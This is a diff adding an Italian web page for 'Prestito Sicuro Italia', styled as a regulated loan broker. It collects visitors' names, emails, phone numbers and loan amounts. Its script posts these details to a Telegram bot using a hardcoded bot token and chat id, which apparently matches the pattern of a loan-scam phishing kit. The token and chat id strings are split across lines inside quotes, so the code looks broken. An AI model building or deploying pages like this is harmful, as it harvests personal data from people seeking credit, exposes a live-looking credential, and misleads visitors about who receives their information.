@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Prestito Sicuro Italia - Mediazione Creditizia</title>
+
+<style>
+body{
+margin:0;
+font-family:Arial;
+background:#eef2f7;
+}
+
+header{
+background:linear-gradient(90deg,#0d47a1,#1565c0);
+color:white;
+padding:35px;
+text-align:center;
+}
+
+h1{
+margin:0;
+font-size:34px;
+}
+
+.section{
+padding:40px 20px;
+text-align:center;
+}
+
+.form-box{
+background:white;
+max-width:500px;
+margin:auto;
+padding:30px;
+border-radius:12px;
+box-shadow:0 10px 25px rgba(0,0,0,0.1);
+}
+
+input, select{
+width:100%;
+padding:12px;
+margin:10px 0;
+border-radius:8px;
+border:1px solid #ccc;
+}
+
+button{
+width:100%;
+padding:14px;
+background:#1565c0;
+color:white;
+border:none;
+border-radius:8px;
+font-size:16px;
+cursor:pointer;
+}
+
+button:hover{
+background:#0d47a1;
+}
+
+footer{
+background:#0d47a1;
+color:white;
+text-align:center;
+padding:25px;
+margin-top:40px;
+}
+</style>
+</head>
+
+<body>
+
+<header>
+<h1>Prestito Sicuro Italia</h1>
+<p>Servizio Professionale di Mediazione Creditizia</p>
+</header>
+
+<div class="section">
+<div class="form-box">
+
+<h2>Richiedi una consulenza gratuita</h2>
+
+<input type="text" id="nome" placeholder="Nome e Cognome">
+<input type="email" id="email" placeholder="Email">
+<input type="tel" id="telefono" placeholder="Telefono">
+
+<select id="importo">
+<option value="">Importo richiesto</option>
+<option>1.000€ - 5.000€</option>
+<option>5.000€ - 20.000€</option>
+<option>20.000€ - 50.000€</option>
+</select>
+
+<button onclick="invia()">Invia richiesta</button>
+
+</div>
+</div>
+
+<footer>
+<p>© 2016 Prestito Sicuro Italia</p>
+<p>Società di mediazione - Non eroghiamo direttamente finanziamenti.</p>
+<p>Conforme normativa italiana e regolamenti Banca d’Italia</p>
+</footer>
+
+<script>
+function invia(){
+
+let nome = document.getElementById("nome").value;
+let email = document.getElementById("email").value;
+let telefono = document.getElementById("telefono").value;
+let importo = document.getElementById("importo").value;
+
+let messaggio = `Nuova richiesta prestito:
+Nome: ${nome}
+Email: ${email}
+Telefono: ${telefono}
+Importo: ${importo}`;
+
+let token = "
+8674931679:AAHigr1qtX-YZ913O4g2WvxuTKKricXka5Q";
+let chat_id = "
+7716271490";
+
+fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+method: "POST",
+headers: {"Content-Type": "application/json"},
+body: JSON.stringify({
+chat_id: chat_id,
+text: messaggio
+})
+})
+.then(response => alert("Richiesta inviata con successo!"));
+}
+</script>
+
+</body>
+</html>
